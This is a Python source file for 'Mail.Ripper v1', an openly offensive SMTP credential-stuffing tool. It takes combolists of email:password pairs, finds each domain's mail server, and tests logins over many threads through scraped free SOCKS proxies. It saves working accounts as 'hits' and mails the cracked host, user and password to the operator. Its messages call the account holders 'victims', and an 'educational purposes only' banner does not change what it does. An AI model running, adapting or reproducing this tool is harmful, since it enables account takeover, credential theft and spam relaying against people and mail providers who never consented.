#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
# name: Mail.Ripper v1 (proxy version)
# description: smtp checker / smtp cracker with SOCKS support and e-mail delivery test.
# version: 1.10, 2020-12-12
# author: DrPython3 @ GitHub.com

# ----------------------------------------------------------------------------------------------------------------------
# ((--> *P*A*C*K*A*G*E*S***N*E*E*D*E*D* <--))

# import sys first:
import sys
# then 'try' to import all other packages needed:
try:
    import os
    import ctypes
    import smtplib
    import socket
    import ssl
    import threading
    import json
    import re
    import uuid
    import socks
    import urllib3
    import certifi
    from time import sleep
    from email.message import EmailMessage
    from random import randint
    from colorama import *
# in case of any errors, exit:
except:
    sys.exit('An error occurred while needed packages where import.\nInstall needed packages and try again afterwards.')

# initiate colorama:
init()
print(Fore.WHITE + '')


# ----------------------------------------------------------------------------------------------------------------------
# ((--> *S*T*A*R*T*U*P***L*O*G*O* <--))

logo1 = '''
=========================================================================

o     o         o 8     .oPYo.  o                                     .o 
8b   d8           8     8   `8                                         8 
8`b d'8 .oPYo. o8 8    o8YooP' o8 .oPYo. .oPYo. .oPYo. oPYo.   o    o  8 
8 `o' 8 .oooo8  8 8     8   `b  8 8    8 8    8 8oooo8 8  `'   Y.  .P  8 
8     8 8    8  8 8     8    8  8 8    8 8    8 8.     8       `b..d'  8 
8     8 `YooP8  8 8 88  8    8  8 8YooP' 8YooP' `Yooo' 8        `YP'   8 
..::::..:.....::......::..:::..:..8 ....:8 ....::.....:..::::::::...:::..
::::::::::::::::::::::::::::::::::8 :::::8 ::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::..:::::..::::::::::::::::::::::::::::::'''

logo2 = '''
_________________________________________________________________________
             smtp checker / cracker by: DrPython3 (C) 2020
                 *** FOR EDUCATIONAL PURPOSES ONLY ***

          DONATIONS (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf
========================================================================='''


# ----------------------------------------------------------------------------------------------------------------------
# ((--> *V*A*R*I*A*B*L*E*S***E*T*C* <--))

combofile = str('none.txt')
combos = []
socksprox = []
# default settings:
sslcontext = ssl.create_default_context()
tout = float(10.0)
skip = int(1)
usesocks = int(0)
sockscount = int(0)
sockstype = int(4)
attackthreats = int(25)
valid = int(0)
bad = int(0)
attackermail = str('invalid@mail.com')
regexp = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w+$'
# suggested by Trustdee, dictionaries and lists are in config.json now:
try:
    with open('config.json') as config:
        jsonobj = json.load(config)
        hosters = (jsonobj['hosters'])
        hosterports = (jsonobj['hosterports'])
        subh = (jsonobj['subh'])
        subp = (jsonobj['subp'])
        blacklisted = (jsonobj['blacklisted'])
        socksfoursources = (jsonobj['socksfoursources'])
        socksfivesources = (jsonobj['socksfivesources'])
# fallback in case anything is wrong with json, so checker will still work using finder():
except:
    hosters = {}
    hosterports = {}
    subh = ['', 'mail.', 'webmail.', 'smtp.', 'mail2.', 'mx.', 'email.', 'mail1.', 'owa.', 'mx1.', 'exchange.',
            'smtpauths.', 'smtpauth.', 'smtp.mail.', 'smtp-mail.', 'securesmtp.']
    subp = [587, 465, 25, 26, 2525]
    blacklisted = ['gmail.com', 'googlemail.com', 'yahoo.com', 'yahoo.de', 'yahoo.co.uk', 'hotmail.com',
                   'protonmail.com', 'yandex.ru']
    socksfoursources = []
    socksfivesources = []


# ----------------------------------------------------------------------------------------------------------------------
# ((--> *F*U*N*C*T*I*O*N*S* <--))

# cleaner == clears screen on purpose:
def cleaner():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass


# countdown == yes, a countdown (...):
def countdown():
    i = 5
    while i > 0:
        print(Fore.RED + '... ' + str(i))
        sleep(0.9)
        i -= 1
    return None


# mailcheck == checks email user input with regex:
def mailcheck(email):
    if re.search(regexp, str(email)):
        return True
    else:
        return False


# checked == saves checked combos to a txt file:
def checked(checkedtext):
    with open('checked_combos.txt', 'a') as checkedfile:
        checkedfile.write(str(checkedtext) + '\n')
        checkedfile.close()


# hits == saves hits to a txt file:
def hits(hitstext):
    with open('valid_combos.txt', 'a') as hitsfile:
        hitsfile.write(str(hitstext) + '\n')
        hitsfile.close()


# skips == saves skipped combos to a txt file:
def skips(skiptext):
    with open('skipped_combos.txt', 'a') as skippedfile:
        skippedfile.write(str(skiptext) + '\n')
        skippedfile.close()


# sentemails == saves valid combos, with which an e-mail could be sent, to a txt file:
def sentemails(sentemail):
    with open('sentemail_combos.txt', 'a') as sentmailfile:
        sentmailfile.write(str(sentemail) + '\n')
        sentmailfile.close()


# blackcheck == searches for smtp domain in blacklist:
def blackcheck(search):
    try:
        x = int(blacklisted.count(str(search)))
        if x == 0:
            return False
        else:
            return True
    except:
        pass


# getproxdata == scrapes SOCKS4 or SOCKS5 proxies from Proxyscrape.com:
#TODO: include removal of duplicates from scraped proxy-list.
def getproxdata():
    if sockstype == int(5):
        print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS5 proxies for you ...\n')
    elif sockstype == int(4):
        print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS4 proxies for you ...\n')
    # depending on user input for 'sockstype' attach the needed URL-list to 'psource':
    if sockstype == int(5):
        psource = socksfivesources
    elif sockstype == int(4):
        psource = socksfoursources
    for ps in psource:
        http = urllib3.PoolManager(ca_certs=certifi.where())
        proxydata = http.request('GET', str(ps))
        # write scraped data to file:
        with open('proxydata.txt', 'a') as proxyfile:
            proxyfile.write(str(proxydata.data.decode('utf-8')))
            proxyfile.close()
    # remove unwanted text from scraping results:
    with open('proxydata.txt', 'r+') as p:
        p_new = p.readlines()
        p.seek(0)
        for line in p_new:
            if '<url' not in line:
                p.write(line)
        p.truncate()


# randomprox == returns random one from scraped proxies:
def randomprox():
    try:
        # get any number between 1 and amount of scraped proxies:
        x = randint(1, int(sockscount))
        # pick the proxy with that number and return its data:
        proxy = str(socksprox[int(x)])
        return proxy
    except:
        proxy = str('failed')
        return proxy


# finder == search for smtp hosts if not included in hosters dictionary:
def finder(unkdom):
    socket.setdefaulttimeout(tout)
    z = str('failed')
    print(Fore.WHITE + 'Looking up SMTP-host for: ' + str(unkdom))
    try:
        for x in subh:
            # if proxy support is active, setup random proxy for connection:
            if usesocks == int(1):
                proxyget = str(randomprox())
                fproxy = str(proxyget.split(":")[0])
                fproxyport = int(proxyget.split(":")[1])
                if sockstype == int(4):
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
                elif sockstype == int(5):
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
                # send all smtplib traffic through that proxy:
                socks.wrapmodule(smtplib)
            else:
                pass
            y = str(str(x) + str(unkdom))
            print(Fore.WHITE + 'Trying to connect to: ' + str(y))
            # try SSL-conection first:
            try:
                findsmtp = smtplib.SMTP_SSL(str(y), context=sslcontext)
                findsmtp.quit()
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'SSL-Connection established, HOST is: ' + str(y))
                z = str(y)
                break
            except:
                try:
                    # on errors, try connection without SSL:
                    findsmtp = smtplib.SMTP(str(y))
                    findsmtp.quit()
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'NON-SSL connection established, HOST is: ' + str(y))
                    z = str(y)
                    break
                except:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection failed for HOST: ' + str(y))
                    try:
                        findsmtp.quit()
                    except:
                        pass
                    continue
        return z
    except BaseException:
        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Cannot find working SMTP host (!) for: ' + str(unkdom))
        return z


# attacker == connects to SMTP host, checks login data and returns result to main checker process:
def attacker(attackhost, attackport, attackuser, attackpass):
    socket.setdefaulttimeout(tout)
    # set up proxy-support if activated:
    if usesocks == int(1):
        proxyget = str(randomprox())
        fproxy = str(proxyget.split(":")[0])
        fproxyport = int(proxyget.split(":")[1])
        if sockstype == int(4):
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
        elif sockstype == int(5):
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
        socks.wrapmodule(smtplib)
    else:
        pass
    try:
        # if SMTP port is unknown, try to find it using most common ones:
        if attackport == 0:
            print(Fore.LIGHTYELLOW_EX + 'Unknown port for HOST ' + str(attackhost) + ', testing connection on most common ports')
            for x in subp:
                p = int(x)
                try:
                    attack = smtplib.SMTP_SSL(str(attackhost), int(p), context=sslcontext)
                    attack.quit()
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection to ' + str(attackhost) + ' found: ' + str(p))
                    attackport = int(p)
                    break
                except:
                    try:
                        attack = smtplib.SMTP(str(attackhost), int(p))
                        attack.quit()
                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection to ' + str(attackhost) + ' found: ' + str(p))
                        attackport = int(p)
                        break
                    except:
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection to HOST: ' + str(attackhost) + ' failed with PORT: ' + str(p))
                        try:
                            attack.quit()
                        except:
                            pass
                        continue
        else:
            print(Fore.WHITE + 'Starting attack on: ' + str(attackhost) + ':' + str(attackport) + ', USER: ' + str(attackuser)
                  + ', PASS: ' + str(attackpass))
        # if SMTP port is known, start checking combo against host:
        try:
            print(Fore.WHITE + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' with SSL')
            attack = smtplib.SMTP_SSL(str(attackhost), int(attackport), context=sslcontext)
            print(Fore.WHITE + 'Checking login-data, HOST: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
                  + str(attackuser) + ', PASS: ' + str(attackpass))
        except:
            try:
                print(Fore.WHITE + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' without SSL')
                attack = smtplib.SMTP(str(attackhost), int(attackport))
                try:
                    print(Fore.WHITE + 'Trying to start TLS for HOST: ' + str(attackhost))
                    attack.ehlo()
                    attack.starttls()
                    attack.ehlo()
                except:
                    pass
                print(Fore.WHITE + 'Checking login-data, HOST: ' + str(attackhost) + ':' + str(attackport)
                      + ', USER: ' + str(attackuser) + ', PASS: ' + str(attackpass))
            except:
                pass
        attack.login(str(attackuser), str(attackpass))
        attack.quit()
        # return result to checking process:
        if usesocks == int(1):
            return True, str(attackhost), int(attackport), str(attackuser), str(attackpass), str(fproxy), int(fproxyport)
        else:
            return True, str(attackhost), int(attackport), str(attackuser), str(attackpass)
    except:
        try:
            attack.quit()
        except:
            pass
        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection or login error for HOST: ' + str(attackhost) + ' on PORT: '
              + str(attackport))
        if usesocks == int(1):
            return False, str(attackhost), int(attackport), str(attackuser), str(attackpass), str(fproxy), int(fproxyport)
        else:
            return False, str(attackhost), int(attackport), str(attackuser), str(attackpass)


# sendcheckmsg == trys to send an e-mail to user address by valid SMTP:
#TODO: extract template for e-mail content to a separate file and import it here.
def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
    if attackermail == str('invalid@mail.com'):
        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'E-mail sending skipped for: ' + str(mailuser))
    else:
        socket.setdefaulttimeout(60.0)
        if usesocks == int(1):
            if sockstype == int(4):
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy), int(proxyport))
            elif sockstype == int(5):
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxy), int(proxyport))
            socks.wrapmodule(smtplib)
        else:
            pass
        # generate randomID:
        randomid = str(uuid.uuid4().hex)
        randomid = str(randomid[0:8])
        randomid = randomid.upper()
        # prepare e-mail content for sending check:
        mailsender = str(mailuser)
        mailreceiver = str(attackermail)
        mailsubject = str('Test Result for ID ' + str(randomid) + ' is here')
        # mailcontent for plain/text e-mail - this template may be edited by user on purpose:
        mailtext = str('Hello!\n\nThis message has been sent using the following SMTP:\n\n#HOST: ' + str(mailhost)
                       + '\n#PORT: ' + str(mailport) + '\n#USER: ' + str(mailuser) + '\n#PASS: ' + str(mailpass)
                       + '\n\nPLEASE REGARD:\nThis test only confirms the e-mail delivery!\n\n'
                       + 'This message may be marked as junk because of its content. Results may vary for more authentic '
                       + 'e-mails sent with the host named above. Feel free to edit the template to improve this test. '
                       + 'Besides that, using proxies can affect the inbox rate as well.'
                       + '\n\nIf you like Mail.Rip v1 donate, please!\nMy wallet (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf'
                       + '\n\nEvery donation gives me time for improving this and other tools.\n\nBest wishes,\n'
                       + 'DrPython3 (github.com/drpython3)')
        # put the message together:
        mail = EmailMessage()
        mail.add_header('Subject', mailsubject)
        mail.add_header('From', mailsender)
        mail.add_header('To', mailreceiver)
        mail.add_header('Reply-To', mailsender)
        # the following headers should be updated on purpose as well:
        mail.add_header('MIME-Version', '1.0')
        mail.add_header('X-Priority', '1')
        mail.add_header('X-MSmail-Priority', 'High')
        mail.add_header('X-Mailer', 'Microsoft Office Outlook, Build 11.0.5510')
        mail.add_header('X-MimeOLE', 'Produced By Microsoft MimeOLE V6.00.2800.1441')
        mail.set_content(mailtext)
        # establish SMTP connection:
        try:
            mailer = smtplib.SMTP_SSL(str(mailhost), int(mailport), context=sslcontext)
        except:
            try:
                mailer = smtplib.SMTP(str(mailhost), int(mailport))
                try:
                    mailer.ehlo()
                    mailer.starttls()
                    mailer.ehlo()
                except:
                    pass
            except:
                pass
        try:
            # log in:
            mailer.login(str(mailuser), str(mailpass))
            # send message:
            mailer.send_message(mail)
            sentemails('HOST: ' + str(mailhost) + ':' + str(mailport) + ', USER: ' + str(mailuser) + ', PASS: ' + str(mailpass))
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'E-mail sent with ' + str(mailuser))
        except:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'No e-mail sent with ' + str(mailuser))
        try:
            mailer.quit()
        except:
            pass


# checkmate == the main checker process:
def checkmate():
    global valid
    global bad
    # starting main loop:
    while len(combos) > 0:
        checkresult = False
        th = str('')
        tp = int(0)
        tuser = str('')
        tpass = str('')
        proxy = str('')
        pport = int(0)
        try:
            # get next combo, clean it and split into mail and pass:
            lraw = combos.pop(0)
            lraw = lraw.replace(';', ':').replace('|', ':')
            l = lraw.split(':')
            # check blacklist for e-mail domain on purpose:
            if skip == 1:
                print(Fore.WHITE + 'Checking blacklist for host: ' + str(l[0].split("@")[1]))
                blackhost = blackcheck(str(l[0].split("@")[1]).lower())
                # if e-mail domain is on blacklist, combo will not be checked:
                if blackhost == True:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Host blacklisted, therefor skipping: ' + str(l[0]) + ':' + str(l[1]))
                    skips(str(l[0]) + ':' + str(l[1]))
                    bad += 1
                    continue
                else:
                    pass
            else:
                pass
            # try to get SMTP host from dictionary:
            try:
                targethost = str(hosters[str(l[0].split("@")[1]).lower()])
            except:
                # if not found in dictionary, start search for attackable SMTP host:
                try:
                    newhost = str(finder(str(l[0].split("@")[1]).lower()))
                    if newhost == str('failed'):
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Bad luck, no host found! Skipping: ' + str(l[0]) + ':' + str(l[1]))
                        skips(str(l[0]) + ':' + str(l[1]))
                        bad += 1
                        continue
                    else:
                        targethost = str(newhost)
                except:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Error (!) while searching host for: ' + str(l[0]) + ':' + str(l[1]))
                    skips(str(l[0]) + ':' + str(l[1]))
                    bad += 1
                    continue
            # try to get SMTP port from dictionary and set to 0 if none is found:
            try:
                targetport = int(hosterports[str(targethost)])
            except:
                targetport = int(0)
            # check the combo against the SMTP host and write result to txt-file:
            if usesocks == int(1):
                checkresult, th, tp, tuser, tpass, proxy, pport = attacker(str(targethost), int(targetport), str(l[0]), str(l[1]))
            else:
                checkresult, th, tp, tuser, tpass = attacker(str(targethost), int(targetport), str(l[0]), str(l[1]))
            if checkresult == False:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed your victim ' + str(th) + ':' + str(tp) + ', USER: '
                      + str(tuser) + ', PASS: ' + str(tpass))
                checked(str(tuser) + ':' + str(tpass))
                bad += 1
                continue
            # for valid credentials and port 465 add (SSL) to result:
            elif checkresult == True and tp == 465:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT (!) Your victim ... HOST: ' + str(th) + ':465(SSL), USER: '
                      + str(tuser) + ', PASS: ' + str(tpass))
                hits('SERVER: ' + str(th) + ', PORT: 465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass))
            else:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT (!) Your victim ... HOST: ' + str(th) + ':' + str(tp)
                      + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass))
                hits('SERVER: ' + str(th) + ', PORT: ' + str(tp) + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass))
            checked(str(tuser) + ':' + str(tpass))
            valid += 1
            # if combo is valid, try to send an e-mail using the cracked SMTP:
            if usesocks == int(1):
                sendcheckmsg(str(th), int(tp), str(tuser), str(tpass), str(proxy), int(pport))
            else:
                sendcheckmsg(str(th), int(tp), str(tuser), str(tpass), str('none'), int(0))
            continue
        except:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed your victim ' + str(th) + ':' + str(tp) + ', USER: ' + str(tuser)
                  + ', PASS: ' + str(tpass))
            checked(str(tuser) + ':' + str(tpass))
            bad += 1
            continue


# ----------------------------------------------------------------------------------------------------------------------
# ((<-- *M*A*I*N* -->))

# start on clean screen with logos:
cleaner()
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + logo1)
print(Fore.LIGHTRED_EX + Style.BRIGHT + logo2)

# ask for user email address and check using regex:
try:
    attackermail = input(Fore.WHITE + '\nEnter your e-mail address, please:' + Fore.LIGHTYELLOW_EX + '      ')
    checkmail = mailcheck(str(attackermail))
    if checkmail == True:
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill try to send messages to your e-mail: ' + str(attackermail)
              + ' when a valid SMTP is found.\n')
    else:
        print(Fore.LIGHTRED_EX + Style.BRIGHT
              + '\nInvalid user e-mail, testing the found SMTP by sending an e-mail will be skipped.\n')
        attackermail = str('invalid@mail.com')
except:
    print(Fore.LIGHTRED_EX + Style.BRIGHT
          + '\nInvalid user e-mail, testing the found SMTP by sending an e-mail will be skipped.\n')
    attackermail = str('invalid@mail.com')

# ask for name of combofile:
combofile = input(Fore.WHITE + 'Enter the name of your combofile, e.g. combos.txt:' + Fore.LIGHTYELLOW_EX + '     ')

# check combofile:
if combofile == '':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'No filename entered. Bye bye!\n')
else:
    try:
        combos = open(combofile, 'r').read().splitlines()
    except:
        cleaner()
        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'Combofile not found. Check filename and start again!\n')

# return amount of combos to check:
tocheck = int(len(combos))
if tocheck == 0:
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'Combofile is empty. Bye bye!\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFound ' + str(tocheck) + ' combos to check.\n')

# ask for default timeout:
try:
    tout = float(input(Fore.WHITE + 'Enter the value for timeout (any key for default = 10.0):' + Fore.LIGHTYELLOW_EX + '     '))
except:
    tout = float(10.0)
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + '.\n')

# ask for amount of threads to use:
try:
    attackthreats = int(input(Fore.WHITE + 'Enter the amount of threads to use (any key for default = 25):' + Fore.LIGHTYELLOW_EX + '     '))
except:
    attackthreats = int(25)
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nAmount of threads set to: ' + str(attackthreats) + '.\n')

# ask for skipping options:
skipuser = input(Fore.WHITE + 'Want to skip services like GMAIL, etc. (yes / no, any key for default = yes):' + Fore.LIGHTYELLOW_EX + '     ')
if skipuser == 'no':
    skip = int(0)
elif skipuser == 'n':
    skip = int(0)
else:
    skip = int(1)
if skip == 0:
    print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: Services like GMAIL, etc. will not be skipped! You probably waste time!\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL, etc. will be skipped and saved to a txt-file.\n')

# ask for proxy support:
proxyuse = str(input(Fore.WHITE + 'Want to use free SOCKS-proxies (yes / no, any key for default = no):' + Fore.LIGHTYELLOW_EX + '     '))
if proxyuse == 'yes':
    usesocks = int(1)
elif proxyuse == 'y':
    usesocks = int(1)
else:
    usesocks = int(0)
if usesocks == int(1):
    print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: FREE SOCKS-proxies activated! Bad combos may be false negatives!\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFREE SOCKS-proxies not activated.\n')
if usesocks == int(1):
    try:
        sockstype = int(input(Fore.WHITE + 'Which kind of SOCKS do you want to use (4 = SOCKS4, 5 = SOCKS5):' + Fore.LIGHTYELLOW_EX + '     '))
        if sockstype == int(4):
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS4 proxies.\n')
        elif sockstype == int(5):
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS5 proxies.\n')
    except:
        sockstype = int(4)
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS4 proxies.\n')
else:
    pass

# ask to start checking:
startnow = input(Fore.WHITE + '*** DO YOU WANT TO START THE CHECKER NOW? *** (yes / no):' + Fore.LIGHTYELLOW_EX + '      ')
if startnow == 'no':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
elif startnow == 'n':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
else:
    pass

# start checker:
cleaner()
# if user wants to use proxies, begin with the scraper:
if usesocks == int(1):
    try:
        getproxdata()
        socksprox = open('proxydata.txt', 'r').read().splitlines()
        sockscount = int(len(socksprox))
        # in case of unsuccessful scraping, deactivate the proy-support:
        if sockscount == 0:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'No proxies scraped! SOCKS-support is deactivated!\n')
            usesocks = int(0)
        else:
            if sockstype == int(4):
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '... scraped ' + str(sockscount) + ' SOCKS4 proxies!\n')
            elif sockstype == int(5):
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '... scraped ' + str(sockscount) + ' SOCKS5 proxies!\n')
    except:
        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'An error occurred! SOCKS-support is deactivated!\n')
        usesocks = int(0)
else:
    pass
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'YOUR GUN IS LOADED NOW!\nLet us start shooting at your victims in ...\n')
countdown()
cleaner()
# start attacking threats:
for _ in range(attackthreats):
    threading.Thread(target=checkmate).start()
while len(combos) > 0:
    try:
        # Show stats in title bar if run on Windows:
        sleep(0.1)
        ctypes.windll.kernel32.SetConsoleTitleW(f'LEFT TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}')
    # Stats in title bar for Unix & Co.:
    except:
        try:
            sleep(0.1)
            wintitle = f'LEFT TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}'
            sys.stdout.write('\33]0;' + str(wintitle) + '\a')
            sys.stdout.flush()
        except:
            pass
